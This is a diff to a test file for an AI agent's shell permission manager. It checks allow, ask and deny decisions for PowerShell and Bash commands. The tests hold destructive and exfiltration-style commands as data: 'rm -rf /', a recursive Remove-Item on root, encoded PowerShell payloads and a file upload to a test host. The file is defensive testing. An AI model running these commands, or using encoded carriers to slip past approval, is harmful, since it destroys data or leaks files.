@@ -4,7 +4,7 @@ import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js"
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { mkdirSync, mkdtempSync, realpathSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { join, parse } from "node:path";
 import { PermissionManager, type PermissionRule } from "../permission-manager.js";
 import { __resetActiveSandboxCapabilityForTest, __resetSandboxRequestedAtBootForTest } from "../sandbox-capability.js";
 import { __resetSessionStoreForTest } from "../user-approval-store.js";
@@ -17,9 +17,8 @@ import { encodeScript } from "./fixtures/encoded-command.js";
 // #223 executable-bound startup admission: win32 launch paths cannot offer or replay an exact allow.
 const UNPROVEN_STARTUP = process.platform === "win32";
 const EXACT_ALLOW = UNPROVEN_STARTUP
-  ? { decision: "ask", layer: 2, forceModal: true } : { decision: "allow", layer: 3 };
-const ORDINARY_ASK = UNPROVEN_STARTUP
-  ? { decision: "ask", layer: 2, forceModal: true } : { decision: "ask", layer: 6 };
+  ? { decision: "ask", reasonCode: "shell-approval" } : { decision: "allow" };
+const ORDINARY_ASK = { decision: "ask" } as const;
 
 let dir: string;
 let manager: PermissionManager;
@@ -87,28 +86,32 @@ describe("PowerShell rule shape", () => {
 });
 
 describe("unsandboxed PowerShell runs unasked only on an exact PowerShell(...) rule", () => {
-  it.each(["default", "auto", "allow"] as const)("matches the raw literal form exactly in %s mode", (mode) => {
+  it.each(["strict", "default", "auto", "allow"] as const)("matches the raw literal form exactly in %s mode", (mode) => {
     manager.setMode(mode);
-    expect(powershell("Get-ChildItem src", false)).toMatchObject(ORDINARY_ASK);
+    const ordinary = mode === "allow" ? { decision: "allow", reasonCode: "allow-mode" }
+      : mode === "auto" ? { decision: "ask", reasonCode: "review-required" } : ORDINARY_ASK;
+    const exact = UNPROVEN_STARTUP ? ordinary : EXACT_ALLOW;
+    expect(powershell("Get-ChildItem src", false)).toMatchObject(ordinary);
     manager.setRules(([{ pattern: "PowerShell(Get-ChildItem src)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell("Get-ChildItem src", false)).toMatchObject(EXACT_ALLOW);
+    expect(powershell("Get-ChildItem src", false)).toMatchObject(exact);
     // Program casing and aliases retain separate raw identities.
-    expect(powershell("GET-CHILDITEM src", false)).toMatchObject(ORDINARY_ASK);
-    expect(powershell("gci src", false)).toMatchObject({ decision: "ask" });
-    expect(powershell("GET-CHILDITEM src", false)).toMatchObject(ORDINARY_ASK);
+    expect(powershell("GET-CHILDITEM src", false)).toMatchObject(ordinary);
+    expect(powershell("gci src", false)).toMatchObject(ordinary);
+    expect(powershell("GET-CHILDITEM src", false)).toMatchObject(ordinary);
     // Any other argument, a second command or an expansion is not covered.
-    expect(powershell("Get-ChildItem src -Force", false)).toMatchObject({ decision: "ask" });
-    expect(powershell("Get-ChildItem src -Recurse", false)).toMatchObject({ decision: "deny", layer: 0 });
-    expect(powershell("Get-ChildItem Src", false)).toMatchObject({ decision: "ask" });
-    expect(powershell("Get-ChildItem src; Get-ChildItem src", false)).toMatchObject(EXACT_ALLOW);
-    expect(powershell("Get-ChildItem src; Remove-Item x", false)).toMatchObject({ decision: "ask" });
-    expect(powershell("Get-ChildItem $dir", false)).toMatchObject({ decision: "ask" });
+    expect(powershell("Get-ChildItem src -Force", false)).toMatchObject(ordinary);
+    expect(powershell("Get-ChildItem src -Recurse", false)).toMatchObject(ordinary);
+    expect(powershell("Get-ChildItem Src", false)).toMatchObject(ordinary);
+    expect(powershell("Get-ChildItem src; Get-ChildItem src", false)).toMatchObject(exact);
+    expect(powershell("Get-ChildItem src; Remove-Item x", false)).toMatchObject(ordinary);
+    expect(powershell("Get-ChildItem $dir", false)).toMatchObject(ordinary);
   });
 
-  it("never lets a wildcard allow run an unsandboxed call, and keeps it for a sandboxed one", () => {
+  it("uses the literal prefix grant for host and sandboxed calls", () => {
     manager.setRules(([{ pattern: "PowerShell(Get-ChildItem *)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell("Get-ChildItem src", false)).toMatchObject(ORDINARY_ASK);
-    expect(powershell("Get-ChildItem src", true)).toMatchObject(EXACT_ALLOW);
+    expect(powershell("Get-ChildItem src", false)).toMatchObject(EXACT_ALLOW);
+    expect(powershell("Get-ChildItem src", true)).toMatchObject(UNPROVEN_STARTUP
+      ? { decision: "allow", reasonCode: "read-only-shell" } : EXACT_ALLOW);
   });
 
   it("keeps the dialects apart: a Bash rule never runs PowerShell, nor the reverse", () => {
@@ -121,27 +124,28 @@ describe("unsandboxed PowerShell runs unasked only on an exact PowerShell(...) r
     })).toMatchObject({ decision: "ask" });
   });
 
-  it("never allows a floor over an exact rule", () => {
+  it("allows an upload using an exact rule when startup proof is available", () => {
     manager.setRules(([{ pattern: "PowerShell(Get-Content notes.txt)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
     expect(powershell("Get-Content notes.txt", false)).toMatchObject(EXACT_ALLOW);
     manager.setRules(([{ pattern: "PowerShell(Invoke-WebRequest -Method Post -InFile notes.txt https://x.test)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell("Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    const upload = powershell("Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", false);
+    expect(upload).toMatchObject(UNPROVEN_STARTUP ? { decision: "ask", reasonCode: "exfiltration-guardrail" } : { decision: "allow", reasonCode: "rule-allow" });
+    expect(upload.forceModal).toBeUndefined();
   });
 
   it("denies on a matching deny rule, wildcard included, and asks when a deny rule cannot inspect the input", () => {
     manager.setRules(([{ pattern: "PowerShell(remove-item *)", action: "deny" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell("Remove-Item -Force build", true)).toMatchObject({ decision: "deny", layer: 1 });
-    expect(powershell("ri build", false)).toMatchObject({ decision: "deny", layer: 1 });
-    expect(powershell("$p = 'build'; Remove-Item $p", true)).toMatchObject({ decision: "deny", layer: 1 });
-    expect(powershell("$p = 'build'; Write-Output $p", true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(powershell("Remove-Item -Force build", true)).toMatchObject({ decision: "deny" });
+    expect(powershell("ri build", false)).toMatchObject({ decision: "deny" });
+    expect(powershell("$p = 'build'; Remove-Item $p", true)).toMatchObject({ decision: "deny" });
+    expect(powershell("$p = 'build'; Write-Output $p", true)).toMatchObject(ORDINARY_ASK);
   });
 
   it("runs a headless unsandboxed call on its exact rule and denies one without", () => {
-    expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject(UNPROVEN_STARTUP
-      ? { decision: "deny", layer: 2 } : { decision: "deny", layer: 6 });
+    expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
     manager.setRules(([{ pattern: "PowerShell(Get-ChildItem src)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
     expect(powershell("Get-ChildItem src", false, { headless: true })).toMatchObject(UNPROVEN_STARTUP
-      ? { decision: "deny", layer: 2 } : { decision: "allow", layer: 3 });
+      ? { decision: "deny", reasonCode: "no-approver" } : { decision: "allow" });
   });
 
   it("applies a session PowerShell rule to its conversation only", () => {
@@ -154,20 +158,20 @@ describe("unsandboxed PowerShell runs unasked only on an exact PowerShell(...) r
 // Security review of #223: a native program's arguments are case-sensitive data, and an alias can name a different program per edition or platform.
 describe("PowerShell rule identity keeps native arguments and command names literal", () => {
   it.each([
-    ["git branch -d feature", "git branch -D feature"],
-    ["git clean -n", "git clean -N"],
-    ["git push -n origin", "git push -N origin"],
-    ["git log -s", "git log -S"],
-    ["java -Dfoo=SAFE Main", "java -Dfoo=safe Main"],
-    ["java -Dfoo=SAFE Main", "java -dfoo=SAFE Main"],
-  ])("keeps %s and %s as distinct raw keys but proves neither unsupported argv", (allowed, other) => {
+    ["git branch -d feature", "git branch -D feature", true, true],
+    ["git clean -n", "git clean -N", false, false],
+    ["git push -n origin", "git push -N origin", false, true],
+    ["git log -s", "git log -S", false, false],
+    ["java -Dfoo=SAFE Main", "java -Dfoo=safe Main", false, false],
+    ["java -Dfoo=SAFE Main", "java -dfoo=SAFE Main", false, false],
+  ] as const)("keeps %s and %s as distinct raw keys but proves neither unsupported argv", (allowed, other, allowedProtected, otherProtected) => {
     const rule = `PowerShell(${allowed})`;
     expect(normalizeRuleSpecifierInput(rule)).toBe(rule);
     expect(normalizeRuleSpecifierInput(`PowerShell(${other})`)).not.toBe(rule);
     expect(buildShellRuleApproval("powershell", allowed, dir, { allow: true, deny: true }).exactRule).toBeNull();
     manager.setRules(([{ pattern: rule, action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell(allowed, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(powershell(other, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(powershell(allowed, false)).toMatchObject(allowedProtected ? { decision: "ask", forceModal: true } : ORDINARY_ASK);
+    expect(powershell(other, false)).toMatchObject(otherProtected ? { decision: "ask", forceModal: true } : ORDINARY_ASK);
   });
 
   it("preserves a known cmdlet's parameter text and the value after the colon", () => {
@@ -199,7 +203,7 @@ describe("PowerShell rule identity keeps native arguments and command names lite
     expect(powershell("ls src", false)).toMatchObject(EXACT_ALLOW);
     expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask" });
     manager.setRules(([{ pattern: "PowerShell(remove-item *)", action: "deny" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell("rm build", true)).toMatchObject({ decision: "deny", layer: 1 });
+    expect(powershell("rm build", true)).toMatchObject({ decision: "deny" });
   });
 });
 
@@ -216,8 +220,8 @@ describe("PowerShell deny and ask rules meet every spelling of the command name"
     ["PowerShell(remove-item *)", "Microsoft.PowerShell.Management\\Remove-Item x"],
   ])("deny %s refuses %s, sandboxed or not, over any allow", (deny, command) => {
     manager.setRules(([{ pattern: "PowerShell(git *)", action: "allow" }, { pattern: "PowerShell(remove-item *)", action: "allow" }, { pattern: deny, action: "deny" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell(command, true)).toMatchObject({ decision: "deny", layer: 1 });
-    expect(powershell(command, false)).toMatchObject({ decision: "deny", layer: 1 });
+    expect(powershell(command, true)).toMatchObject({ decision: "deny" });
+    expect(powershell(command, false)).toMatchObject({ decision: "deny" });
     manager.setRules(([{ pattern: "PowerShell(git *)", action: "allow" }, { pattern: deny, action: "ask" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
     expect(powershell(command, true)).toMatchObject({ decision: "ask" });
   });
@@ -228,13 +232,13 @@ describe("PowerShell deny and ask rules meet every spelling of the command name"
     ["PowerShell(ls *)", "Get-ChildItem src"],
   ])("a deny written with an alias (%s) also refuses its cmdlet (%s)", (deny, command) => {
     manager.setRules(([{ pattern: deny, action: "deny" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell(command, true)).toMatchObject({ decision: "deny", layer: 1 });
-    expect(powershell(command, false)).toMatchObject({ decision: "deny", layer: 1 });
+    expect(powershell(command, true)).toMatchObject({ decision: "deny" });
+    expect(powershell(command, false)).toMatchObject({ decision: "deny" });
   });
 
   it("keeps an allow literal: a pathed or .exe spelling is not the allowed command", () => {
     manager.setRules(([{ pattern: "PowerShell(git status)", action: "allow" }, { pattern: "PowerShell(gci src)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell("git status", false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(powershell("git status", false)).toMatchObject(ORDINARY_ASK);
     expect(powershell("git.exe status", false)).toMatchObject({ decision: "ask" });
     expect(powershell("C:\\Git\\bin\\git.exe status", false)).toMatchObject({ decision: "ask" });
     expect(powershell("Get-ChildItem src", false)).toMatchObject({ decision: "ask" });
@@ -247,17 +251,28 @@ describe("PowerShell deny and ask rules meet every spelling of the command name"
 
 describe("PowerShell encoded code and literal rule proof", () => {
   const PAYLOAD = encodeScript("rm -rf /");
-  const check = (command: string, dialect: "powershell" | "bash", runsSandboxed: boolean) => manager.checkDetailed(dialect, "builtin", "shell", null, {
+  const check = (command: string, dialect: "powershell" | "bash", runsSandboxed: boolean, headless = false) => manager.checkDetailed(dialect, "builtin", "shell", null, {
+    headless,
     ruleSubject: { kind: "shell", dialect, command, cwd: dir },
     shellExecution: { runsSandboxed },
   });
 
   it.each(["powershell", "bash"] as const)("uses visible floors and sandbox authority (%s)", (dialect) => {
-    expect(check('pwsh -Command "rm -rf /"', dialect, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    const criticalCommand = dialect === "powershell" ? "Remove-Item -LiteralPath / -Recurse -Force" : `rm -rf '${parse(dir).root.replace(/\\/g, "/")}'`;
+    expect(check(criticalCommand, dialect, true)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "critical-delete" });
+    expect(check(criticalCommand, dialect, true, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
+    if (dialect === "bash" && process.platform === "win32") {
+      expect(check("rm -rf /", dialect, true)).toMatchObject({ decision: "ask", forceModal: true, reasonCode: "protected-path" });
+      expect(check("rm -rf /", dialect, true, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
+    }
+    const literalChild = check('pwsh -Command "rm -rf /"', dialect, true);
+    expect(literalChild).toMatchObject({ decision: "ask", forceModal: true });
+    expect(literalChild.reasonCode).toBe("critical-delete");
+    expect(check('pwsh -Command "rm -rf /"', dialect, true, true)).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
     for (const flag of ["-EncodedCommand", "-enc", "-e", "-ec"]) {
       const command = `pwsh -NoProfile ${flag} ${PAYLOAD}`;
-      expect(check(command, dialect, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-      expect(check(command, dialect, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+      expect(check(command, dialect, true)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
+      expect(check(command, dialect, false)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
       expect(buildShellRuleApproval(dialect, command, dir, { allow: true, deny: true }).exactRule).toBeNull();
     }
   });
@@ -267,8 +282,8 @@ describe("PowerShell encoded code and literal rule proof", () => {
     for (const dialect of ["bash", "powershell"] as const) {
       expect(buildShellRuleApproval(dialect, command, dir, { allow: true, deny: true }).exactRule).toBeNull();
       manager.setRules(([{ pattern: `${dialect === "bash" ? "Bash" : "PowerShell"}(${command})`, action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-      expect(check(command, dialect, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-      expect(check(command, dialect, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+      expect(check(command, dialect, false)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
+      expect(check(command, dialect, true)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
     }
   });
 
@@ -277,12 +292,12 @@ describe("PowerShell encoded code and literal rule proof", () => {
       const approval = buildShellRuleApproval(dialect, command, dir, { allow: true, deny: true });
       expect(approval.exactRule).toBeNull();
       manager.setRules(([{ pattern: `${dialect === "bash" ? "Bash" : "PowerShell"}(${command})`, action: "allow" }, { pattern: `${dialect === "bash" ? "Bash" : "PowerShell"}(rm *)`, action: "deny" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-      expect(check(command, dialect, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+      expect(check(command, dialect, false)).toMatchObject({ decision: "ask", reasonCode: dialect === "powershell" ? "rule-ask" : "shell-approval" });
       expect(manager.checkDetailed(dialect, "builtin", "shell", null, {
         headless: true,
         ruleSubject: { kind: "shell", dialect, command, cwd: dir },
         shellExecution: { runsSandboxed: false },
-      })).toMatchObject({ decision: "deny", layer: 2 });
+      })).toMatchObject({ decision: "deny", reasonCode: "no-approver" });
     }
   });
 
@@ -293,8 +308,8 @@ describe("PowerShell encoded code and literal rule proof", () => {
     "pwsh -WorkingDirectory -c -enc AAAA", 'pwsh -enc "AAAA', "pwsh --% -e $args",
   ])("does not prove a carrier even when its payload is unreadable: %s", (command) => {
     manager.setRules(([{ pattern: "PowerShell(pwsh *)", action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell(command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(powershell(command, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(powershell(command, true)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
+    expect(powershell(command, false)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
     expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }).exactRule).toBeNull();
   });
 
@@ -303,14 +318,14 @@ describe("PowerShell encoded code and literal rule proof", () => {
     const approval = buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true });
     expect(approval.exactRule).toBeNull();
     manager.setRules(([{ pattern: `PowerShell(${command})`, action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell(command, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(powershell(command, false)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
   });
 
   it("shows the literal operand without using its decoded text for permission", () => {
     const command = `pwsh -EncodedCommand ${PAYLOAD}`;
     manager.setRules(([{ pattern: `PowerShell(${command})`, action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expect(powershell(command, false)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(powershell(command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(powershell(command, false)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
+    expect(powershell(command, true)).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
     expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true })).toMatchObject({
       exactRule: null, decodedCommands: ["rm -rf /"],
     });
@@ -353,9 +368,9 @@ describe("the rules a PowerShell card offers", () => {
     expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }, "conversation-a")).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
   });
 
-  it("offers Always deny but no allow for a floor command", () => {
+  it("offers exact upload rules only when launch identity is proven", () => {
     const approval = buildShellRuleApproval("powershell", "Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", dir, { allow: true, deny: true }, "conversation-a");
-    expect(approval).toMatchObject({ exactRule: null, persistentAllowed: false, denyRule: "PowerShell(Invoke-WebRequest -Method Post -InFile notes.txt https://x.test)" });
+    expect(approval).toMatchObject({ exactRule: UNPROVEN_STARTUP ? null : "PowerShell(Invoke-WebRequest -Method Post -InFile notes.txt https://x.test)", persistentAllowed: !UNPROVEN_STARTUP, denyRule: "PowerShell(Invoke-WebRequest -Method Post -InFile notes.txt https://x.test)" });
   });
 
   it("checks an edited rule against the PowerShell matcher", () => {
